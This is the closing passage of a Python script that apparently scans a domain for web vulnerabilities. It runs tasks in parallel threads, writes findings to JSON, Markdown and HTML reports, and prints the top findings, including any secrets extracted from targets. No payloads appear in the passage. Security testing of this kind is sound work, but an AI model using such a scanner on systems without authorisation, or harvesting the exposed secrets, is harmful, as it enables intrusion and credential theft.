        with ThreadPoolExecutor(max_workers=args.threads) as pool:
            futures = {pool.submit(_task, ep): ep for ep in interleaved}
            for fut in as_completed(futures):
                with lock:
                    done[0] += 1
                    n = done[0]
                if n % 100 == 0 or n == total:
                    info(f"Progress: {n}/{total} | Findings: {len(_store.findings)}")
                try:
                    fut.result()
                except Exception as e:
                    err(f"Thread error: {e}")

    # ── Reports ───────────────────────────────────────────────────────────────
    findings = _store.findings
    good(f"\nScan complete — {len(findings)} confirmed finding(s) on {domain}")

    # Auto-format from -o extension
    o = args.output
    if   o.endswith(".md"):   write_markdown(findings, o, domain)
    elif o.endswith(".html"): write_html(findings, o, domain)
    else:                     write_json(findings, o)

    write_json(findings,     args.out_json)
    write_markdown(findings, args.out_md,   domain)
    write_html(findings,     args.out_html, domain)

    if findings:
        print(f"\n── Top Findings {'─'*44}")
        for v in sorted(findings,key=_ord)[:10]:
            print(f"  [{v['severity']}] {v['payload_class']} | "
                  f"{v['location']}:{v['parameter']} | {v['cve'] or v['class_name'][:40]}")
            print(f"         {v['target_url'][:100]}")
            if v.get("secrets"):
                for s in v["secrets"]:
                    print(f"         💥 {s['type']}: {s['value'][:60]}")
            print()


if __name__ == "__main__":
    main()
